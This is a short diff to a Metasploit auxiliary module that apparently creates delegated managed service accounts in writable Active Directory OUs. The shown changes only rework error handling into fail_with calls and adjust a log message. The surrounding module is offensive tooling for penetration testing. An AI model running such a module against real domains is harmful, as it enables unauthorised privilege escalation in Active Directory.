@@ -125,9 +125,13 @@ class MetasploitModule < Msf::Auxiliary
       Exploit::CheckCode::Appears
     end
   rescue Errno::ECONNRESET
-    return Exploit::CheckCode::Unknown('The connection was reset')
-  rescue Rex::ConnectionError, Net::LDAP::Error => e
-    return Exploit::CheckCode::Unknown(e.message)
+    fail_with(Failure::Disconnected, 'The connection was reset.')
+  rescue Rex::ConnectionError => e
+    fail_with(Failure::Unreachable, e.message)
+  rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e
+    fail_with(Failure::NoAccess, e.message)
+  rescue Net::LDAP::Error => e
+    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
   end
 
   def get_ous_we_can_write_to
@@ -174,7 +178,7 @@ class MetasploitModule < Msf::Auxiliary
     sam_account_name = account_name
     sam_account_name += '$' unless sam_account_name.ends_with?('$')
     dn = "CN=#{account_name},#{writeable_dn}"
-    print_status("Attempting to create dmsa account cn: #{account_name}, dn: #{dn}")
+    print_status("Attempting to create dMSA account CN: #{account_name}, DN: #{dn}")
 
     dmsa_attributes = {
       'objectclass' => ['top', 'person', 'organizationalPerson', 'user', 'computer', 'msDS-DelegatedManagedServiceAccount'],
